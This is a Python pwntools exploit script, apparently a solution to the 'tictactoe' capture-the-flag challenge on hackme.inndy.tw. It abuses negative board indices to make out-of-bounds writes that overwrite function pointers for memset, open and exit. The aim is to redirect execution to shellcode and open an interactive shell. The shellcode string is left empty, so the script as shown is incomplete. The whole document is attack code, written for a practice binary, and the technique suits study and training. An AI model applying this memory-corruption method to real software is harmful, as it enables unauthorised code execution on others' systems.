#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
import time
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

shellcode=""

def debug(addr = '0x08048aae'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

def input_number(number):
    io.recvuntil('Input move (9 to change flavor): ')
    io.sendline('9')
    #time.sleep(2)
    io.send(number)
def input_addr(addr):
    io.recvuntil('Input move (9 to change flavor): ')
    io.sendline(addr)

elf = ELF('/home/h11p/hackme/tictactoe')


io = process('/home/h11p/hackme/tictactoe')
#io = remote('hackme.inndy.tw', 7714)
debug()
io.recvuntil('Play (1)st or (2)nd? ')
io.sendline('1')
#change memset to loop
input_number(p32(0xd5))
input_addr('-34')
input_number(p32(0x8b))
input_addr('-33')

#change open to change_code
input_number(p32(0xab))
input_addr('-42')
input_number(p32(0x86))
input_addr('-41')
input_number(p32(0x04))
input_addr('-40')
input_number(p32(0x08))
input_addr('-39')

#change exit to exec shellcode
input_number(p32(0x00))
input_addr('-46')
input_number(p32(0xa0))
input_addr('-45')
input_number(p32(0x04))
input_addr('-44')
input_number(p32(0x08))
input_addr('-43')


#change 0x804a000 to shellcode
input_number(p32(0x90))
input_addr('-4182')

#get flag
input_number(p32(0xff))
input_addr('-9')
input_number(p32(0xff))
input_addr('-8')
input_number(p32(0xff))
input_addr('-7')


io.interactive()
#io.recv()


